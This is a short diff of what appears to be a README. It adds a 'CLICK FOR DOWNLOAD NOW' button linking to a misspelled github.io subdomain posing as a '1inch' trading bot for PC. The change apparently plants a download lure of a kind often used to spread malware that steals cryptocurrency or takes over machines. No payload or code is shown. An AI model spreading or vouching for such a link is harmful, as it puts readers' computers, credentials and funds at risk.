@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( https://1inch-tradig-bot-pcwin-dy58.github.io/.github/) |
  |---------------------|----------------------:|
 
 
